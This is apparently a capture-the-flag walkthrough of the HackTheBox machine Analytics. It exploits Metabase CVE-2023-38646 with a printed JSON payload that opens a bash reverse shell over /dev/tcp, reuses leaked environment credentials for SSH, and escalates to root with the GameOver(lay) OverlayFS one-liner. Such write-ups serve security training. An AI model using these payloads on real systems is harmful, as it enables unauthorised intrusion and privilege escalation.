HTB: Analytics
==============

![Analytics](https://0xdf.gitlab.io/img/analytics-cover.png)

Analytics starts with a webserver hosting an instance of Metabase. There’s a pre-auth RCE exploit that involves leaking a setup token and using it to start the server setup, injecting into the configuration to get code execution. Inside the Metabase container, I’ll find creds in environment variables, and use them to get access to the host. From there I’ll exploit the GameOver(lay) vulnerability to get a shell as root, and include a video explaining the exploit.

## Box Info

Name[Analytics](https://www.hackthebox.com/machines/analytics) [![Analytics](https://0xdf.gitlab.io/icons/box-analytics.png)](https://www.hackthebox.com/machines/analytics)

[Play on HackTheBox](https://www.hackthebox.com/machines/analytics)Release Date[07 Oct 2023](https://twitter.com/hackthebox_eu/status/1709949366814019721)Retire Date23 Mar 2024OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsEasy \[20\]Rated Difficulty![Rated difficulty for Analytics](https://0xdf.gitlab.io/img/analytics-diff.png)Radar Graph![Radar chart for Analytics](https://0xdf.gitlab.io/img/analytics-radar.png)![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)03:18:45 [![Imm0](https://www.hackthebox.eu/badge/image/122838)](https://app.hackthebox.com/users/122838)

![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)03:29:25 [![xct](https://www.hackthebox.eu/badge/image/13569)](https://app.hackthebox.com/users/13569)

Creators[![7u9y](https://www.hackthebox.eu/badge/image/260996)](https://app.hackthebox.com/users/260996)

[![TheCyberGeek](https://www.hackthebox.eu/badge/image/114053)](https://app.hackthebox.com/users/114053)

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.233
Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-14 01:25 EDT
Nmap scan report for 10.10.11.233
Host is up (0.12s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.233Starting Nmap 7.80 ( https://nmap.org ) at 2024-03-14 01:26 EDT
Nmap scan report for 10.10.11.233
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.58 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 22.04 jammy. The webserver is redirecting to `http://analytical.htb`.

### Subdomain Fuzz

When I try to access the page via the IP address, the server returns a 302 redirect to `http://analytical.htb`. When I visit that URL, I get the page. This means the server is doing host-based routing. I’ll use `ffuf` to try a subdomains of `analytical.htb` to see if any returns anything different with the following options:

- `-u http://10.10.11.233` \- The URL to test.
- `-H "Host: FUZZ.analyitcal.htb"` \- Sets the Host HTTP header. This is what the routing is based on, and `FUZZ` will be replaced by each word in the given wordlist.
- `-w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt` \- The wordlist to try. The top 20000 subdomains seems like a good amount to check and can run in about a minute.
- `-mc all` \- Match on all response codes.
- `-ac` \- Do smart filtering. Find the default response and hide all other responses that match.

```
oxdf@hacky$ ffuf -u http://10.10.11.233 -H "Host: FUZZ.analytical.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.233
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.analytical.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
________________________________________________

data                    [Status: 200, Size: 77883, Words: 3574, Lines: 28, Duration: 187ms]
:: Progress: [19966/19966] :: Job [1/1] :: 349 req/sec :: Duration: [0:00:58] :: Errors: 0 ::

```

This identifies `data.analytical.htb` returns something different.

I’ll add both these to my `/etc/hosts` file:

```
10.10.11.233 analytical.htb data.analytical.htb

```

I’ll scan both of these with `nmap`, but nothing new worth nothing comes out.

### analytical.htb - TCP 80

#### Site

The site is for a data analytics firm:

![image-20240313185553955](https://0xdf.gitlab.io/img/image-20240313185553955.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

All of the links at the top lead to sections of the main page, except for “Login”, which goes to `data.analytical.htb`.

There are some names in the “Our Team” section. There’s a contact form, but submitting it doesn’t actually send any data to the server, so that’s likely a dead end.

There is an email address, `due@analytical.com`

#### Tech Stack

The main page loads as `index.html`, which suggests this is a static site.

The HTTP response headers don’t show anything besides nginx:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 13 Mar 2024 22:47:14 GMT
Content-Type: text/html
Last-Modified: Fri, 25 Aug 2023 15:24:42 GMT
Connection: close
ETag: W/"64e8c7ba-4311"
Content-Length: 17169

```

The 404 page is the standard nginx page:

![image-20240313190117635](https://0xdf.gitlab.io/img/image-20240313190117635.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and it finds nothing:

```
oxdf@hacky$ feroxbuster -u http://analytical.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://analytical.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        7l       12w      162c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       12w      178c http://analytical.htb/images => http://analytical.htb/images/
301      GET        7l       12w      178c http://analytical.htb/css => http://analytical.htb/css/
301      GET        7l       12w      178c http://analytical.htb/js => http://analytical.htb/js/
200      GET      364l     1136w    17169c http://analytical.htb/
[####################] - 1m    120000/120000  0s      found:4       errors:0
[####################] - 1m     30000/30000   405/s   http://analytical.htb/
[####################] - 1m     30000/30000   407/s   http://analytical.htb/images/
[####################] - 1m     30000/30000   407/s   http://analytical.htb/css/
[####################] - 1m     30000/30000   407/s   http://analytical.htb/js/

```

### data.analytical.htb - TCP 80

#### Site

This site offers a login page to an instance of the open-source data analytics platform [Metabase](https://www.metabase.com/):

![image-20240313191644258](https://0xdf.gitlab.io/img/image-20240313191644258.png)

I don’t have creds, so not much to do here.

#### Tech Stack

The HTTP response headers still show nginx, but there’s a lot more:

```
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 13 Mar 2024 23:10:55 GMT
Content-Type: text/html;charset=utf-8
Connection: close
X-Frame-Options: DENY
X-XSS-Protection: 1; mode=block
Last-Modified: Wed, 13 Mar 2024 23:10:55 GMT
Strict-Transport-Security: max-age=31536000
X-Permitted-Cross-Domain-Policies: none
Cache-Control: max-age=0, no-cache, must-revalidate, proxy-revalidate
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'none'; script-src 'self' 'unsafe-eval' https://maps.google.com https://accounts.google.com    'sha256-K2AkR/jTLsGV8PyzWha7/ey1iaD9c5jWRYwa++ZlMZc=' 'sha256-ib2/2v5zC6gGM6Ety7iYgBUvpy/caRX9xV/pzzV7hf0=' 'sha256-isH538cVBUY8IMlGYGbWtBwr+cGqkc4mN6nLcA7lUjE='; child-src 'self' https://

```

Nothing super interesting.

Looking at the [Metabase GitHub page](https://github.com/metabase/metabase) shows it’s Java-based (under releases, it offers a `.jar` file). I’ve love to find something that leaks a version, but I don’t find anything.

### Identify CVE-2023-38646

Searching for “Metabase exploit” returns a bunch of references to CVE-2023-38646:

![image-20240313192630141](https://0xdf.gitlab.io/img/image-20240313192630141.png)

This is definitely worth looking at.

### CVE-2023-38646 Details

The [security advisory from Metabase](https://www.metabase.com/blog/security-advisory) is very vague about the issue. Luckily, [this blog post](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646) from Assetnote goes into detail on this vulnerability.

Metabase has this token called the `setup-token` that is needed to run the initialization / setup for the application. Typically, when the user visits the instance, if setup is complete, they are redirected to login. If it is not, then the `setup-token` is embedded in the page and they are redirected to the setup process. Metabase intended that the `setup-token` be deleted once setup is complete. However, starting from a [commit made in January 2022](https://github.com/metabase/metabase/commit/0526d88f997d0f26304cdbb6313996df463ad13f#diff-44990eafd7da3ac7942a9f232b56ec045c558fdc3c414a2439e42b5668eced32L141), the token was no longer cleared. Worse, remains available to unauthenticated users in two places:

1. In the HTML source of the logon page.
2. At `/api/session/properties`.

With the token, a request to `/api/setup/validate` with a malicious `db` connection allows for the execution of arbitrary commands.

### Exploit

#### Get setup-token

There are plenty of exploits out there I can find with a quick search, but this exploit is simple enough that I will do it manually to really understand what it’s doing.

Visiting `/api/session/properties` returns a _huge_ JSON blob. I know there’s a `setup-token` in there somewhere. I’ll start by using `jq` to get the top level keys. There are 60, and `setup-token` is one of them:

```
oxdf@hacky$ curl data.analytical.htb/api/session/properties -s | jq '. | keys | .[]' | wc -l
60
oxdf@hacky$ curl data.analytical.htb/api/session/properties -s | jq -r '. | keys | .[]' | grep setup-token
setup-token

```

Because there’s a “-“ in the key value, I’ll need to wrap it in double quotes:

```
oxdf@hacky$ curl data.analytical.htb/api/session/properties -s | jq -r '."setup-token"'
249fa03d-fd94-4d5b-b94f-b4ebf3df681f

```

#### Generate Payload

The blog post uses this HTTP POST request to exploit:

```
POST /api/setup/validate HTTP/1.1
Host: localhost
Content-Type: application/json
Content-Length: 812

{
    "token": "5491c003-41c2-482d-bab4-6e174aa1738c",
    "details":
    {
        "is_on_demand": false,
        "is_full_sync": false,
        "is_sample": false,
        "cache_ttl": null,
        "refingerprint": false,
        "auto_run_queries": true,
        "schedules":
        {},
        "details":
        {
            "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEuMS4xLjEvOTk5OCAwPiYx}|{base64,-d}|{bash,-i}')\n$$--=x",
            "advanced-options": false,
            "ssl": true
        },
        "name": "an-sec-research-team",
        "engine": "h2"
    }
}

```

I’ll need to update the `token`. There’s a command in the `db` key that is running `bash -c` with an `echo` of some base64-encoded data into `base64 -d` and then into `bash -i` (it’s using [brace expansion](https://www.gnu.org/software/bash/manual/html_node/Brace-Expansion.html) to replace spaces).

I’ll create a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) in the same format:

```
oxdf@hacky$ echo 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==

```

It’s not strictly required, but I don’t love the special characters, so I’ll add some spaces to the command string until they are gone:

```
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMQo=
oxdf@hacky$ echo 'bash  -i >& /dev/tcp/10.10.14.6/443 0>&1 ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK

```

So my `db` string will be:

```
zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMSAK}|{base64,-d}|{bash,-i}')\n$$--=x

```

#### Send

With `nc` listening on 443, I’ll find a request to `data.analytics.htb` in Burp, and send it to Repeater. It doesn’t matter what it is, as I’m going to completely change it (I just want the target to be set correctly). In the Request pane, I’ll update the `Host` header from `localhost` to `data.analytical.htb`, the `token`, and the `db` string:

![image-20240313195636750](https://0xdf.gitlab.io/img/image-20240313195636750.png)

When I send, it hangs for a second, and then at `nc` there’s a shell:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.233 46282
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
b7ed0bb2dd1e:/$

```

### Exploit Script

#### Script Analysis

I mentioned above there were many POC scripts available on GitHub. For example, I can grab [this one](https://github.com/Pyr0sec/CVE-2023-38646/blob/main/exploit.py) and save it as a file on my VM.

Taking a quick look at the script, it’s doing the same thing I did above. It takes the URL, token, and the command to run. I don’t know why it doesn’t get the token for me (it would be just one more request and parsing JSON, a couple lines of Python). The script takes the input URL and builds the `validate` endpoint, and the request:

[![image-20240313200342725](https://0xdf.gitlab.io/img/image-20240313200342725.png)_Click for full size image_](https://0xdf.gitlab.io/img/image-20240313200342725.png)

The input command is base64 encoded, and then used in the request in the same brace-expanded format:

![image-20240313200422498](https://0xdf.gitlab.io/img/image-20240313200422498.png)

#### Running

Running this is very simple:

```
oxdf@hacky$ python cve-2023-38646.py -u http://data.analytical.htb -t 249fa03d-fd94-4d5b-b94f-b4ebf3df681f -c 'bash -i >& /dev/tcp/10.10.14.6/443 0>&1'
Payload sent!

NOTE: Make sure to open a listener on the specified port and address if you entered a reverse shell command.

RESPONSE:
{"message":"Error creating or initializing trigger \"PWNSHELL\" object, class \"..source..\", cause: \"org.h2.message.DbException: Syntax error in SQL statement \"\"//javascript\\\\000ajava.lang.Runtime.getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYx}|{base64,-d}|{bash,-i}')\\\\000a\"\" [42000-212]\"; see root cause for details; SQL statement:\nSET TRACE_LEVEL_SYSTEM_OUT 1 [90043-212]"}

```

While it returns an error here, it also returns a shell at `nc` listening on 443.

### Enumeration

#### Container

I can try a [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q), but neither `script` nor `python` are installed. This smells like a container. Additionally, the hostname is random characters. There’s a `.dockerenv` file in the system root:

```
b7ed0bb2dd1e:/$ ls -a
.
..
.dockerenv
app
bin
dev
etc
home
lib
media
metabase.db
mnt
opt
plugins
proc
root
run
sbin
srv
sys
tmp
usr
var

```

And the IP address is 172.17.0.2, not 10.10.11.233 that I’d been interacting with:

```
b7ed0bb2dd1e:/$ ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02
          inet addr:172.17.0.2  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:2213 errors:0 dropped:0 overruns:0 frame:0
          TX packets:3441 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0
          RX bytes:175999 (171.8 KiB)  TX bytes:5502423 (5.2 MiB)

```

#### Filesystem

The file system is pretty bare. Metabase is in `/app`:

```
b7ed0bb2dd1e:/$ ls /app
certs
metabase.jar
run_metabase.sh

```

There is a single user with a home directory, but it’s completely empty:

```
b7ed0bb2dd1e:/$ ls /home
metabase
b7ed0bb2dd1e:/$ ls -la /home/metabase
total 8
drwxr-sr-x    1 metabase metabase      4096 Aug 25  2023 .
drwxr-xr-x    1 root     root          4096 Aug  3  2023 ..
lrwxrwxrwx    1 metabase metabase         9 Aug  3  2023 .ash_history -> /dev/null
lrwxrwxrwx    1 metabase metabase         9 Aug 25  2023 .bash_history -> /dev/null

```

#### Environment Variables

`env` will show the environment variables:

```
b7ed0bb2dd1e:/$ env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=b7ed0bb2dd1e
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=4
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
OLDPWD=/

```

`META_USER=metalytics` and `META_PASS=An4lytics_ds20223#` jump out as interesting!

### SSH

The password works for the metalytics user for SSH into the host machine:

```
oxdf@hacky$ sshpass -p 'An4lytics_ds20223#' ssh metalytics@analytical.htb
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-25-generic x86_64)
...[snip],...
metalytics@analytics:~$

```

And I can grab `user.txt`:

```
metalytics@analytics:~$ cat user.txt
88a2e60b************************

```

## Shell as root

### Enumeration

#### Filesystem

The filesystem is relatively bare. There’s nothing of interest in metalytics’ home directory, and no other users in `/home`.

The nginx configuration directory shows two site configurations:

```
metalytics@analytics:/etc/nginx/sites-enabled$ ls
analytical  data.analytical.htb

```

`analytical` has the web root in `/var/www/site`, and also has the check against the `Host` header ( `$host`) to redirect if it isn’t `analytical.htb`:

```
server {
    listen 80;
    listen [::]:80;
    root /var/www/site;
    index index.html;
    server_name analytical.htb;

    if ($host != analytical.htb) {
        rewrite ^ http://analytical.htb/;
    }

    location / {
        try_files $uri $uri/ =404;
    }
}

```

`data.analytical.htb` is configured to match on that host name ( `server_name`) and to pass everything to `localhost:3000` (which I can conclude must be a pass through to the Metabase Docker container):

```
server {
    listen 80;

    server_name data.analytical.htb;

    location / {
        proxy_pass          http://localhost:3000;
        proxy_http_version  1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
    }
}

```

The web root in `/var/www/site` show that it’s just a static page as I guessed:

```
metalytics@analytics:/var/www/site$ ls
css  images  index.html  js

```

#### Processes

The `/proc` directory is mounted with `hidepid=invisible`:

```
metalytics@analytics:/$ mount | grep ^proc
proc on /proc type proc (rw,relatime,hidepid=invisible)

```

This means that users can only see processes they start:

```
metalytics@analytics:/$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
metalyt+ 3333448  0.0  0.2  17080  9600 ?        Ss   00:08   0:00 /lib/systemd/systemd --user
metalyt+ 3333515  0.0  0.1   8804  5632 pts/1    Ss   00:08   0:00 -bash
metalyt+ 3615769  0.0  0.0  10068  3328 pts/1    R+   01:08   0:00 ps auxww

```

So nothing interesting here.

#### OS / Kernel

The operating system is, as identified above, Ubuntu 22.04:

```
metalytics@analytics:/$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

```

The kernel version is:

```
metalytics@analytics:/$ uname -a
Linux analytics 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 x86_64 x86_64 GNU/Linux

```

### GameOver(lay)

#### Identify Vulnerability

A search for the kernel version with the word “vulnerability” returns a bunch of references to GameOver(lay):

![image-20240313211500311](https://0xdf.gitlab.io/img/image-20240313211500311.png)

This was a very trendy bug in the information security newcycle in late July 2023, just before Analytics was submitted to HTB on 10 August and released on 7 October.

#### Exploit Explanation

Gameover(lay) is a vulnerability in the OverlayFS, which is a mount filesystem for Linux, and common on many distributions. Julia Evans has a [great post](https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/) and cartoon on how OverlayFS is used to power things like Docker containers:

![](https://0xdf.gitlab.io/img/overlay.jpeg)

The exploit for Gameover(lay) is surprisingly short, some joking that it “fits in a tweet”:

> Exploit is so easy it fits in a tweet🔥
>
> unshare -rm sh -c "mkdir l u w m && cp /u\*/b\*/p\*3 l/;
>
> setcap cap\_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/\*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")' [https://t.co/qb53rfeh0y](https://t.co/qb53rfeh0y) [pic.twitter.com/O9lcif1Yad](https://t.co/O9lcif1Yad)
>
> — liad eliyahu (@liadeliyahu) [July 28, 2023](https://twitter.com/liadeliyahu/status/1684841527959273472?ref_src=twsrc%5Etfw)

And yet it’s pretty dense. It’s fine to grab an exploit and run it, but it’s better to understand what it’s doing. I’ll break it down in [this video](https://www.youtube.com/watch?v=nlYNuUKiGr0):

In the video I mentioned that the version of Python in `u`, while also having the capability isn’t executed that way. IppSec pointed out to me that the `u` version has different extended attributes, including `trusted.overlay.origin`. That would typically be viewable with `getfattr`, but that isn’t installed on Analytics. It is also visible with Python’s `os` module (and running as root):

```
>>> os.listxattr('l/python3')
['security.capability']
>>> os.listxattr('u/python3')
['security.capability', 'trusted.overlay.origin']

```

It could also be related to the value of the `security.capability` attribute.

#### Run Exploit

The exploit I like is this:

```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; id")'

```

This code escalates and runs the `id` command, and pasting it in returns a user id of root:

```
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; id")'
uid=0(root) gid=1000(metalytics) groups=1000(metalytics)

```

If I update that by replacing `id` with `bash`:

```
metalytics@analytics:~$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("rm -rf l m u w; bash")'
root@analytics:~#

```

And grab `root.txt`:

```
root@analytics:/root# cat root.txt
4fcb8f1e************************

```





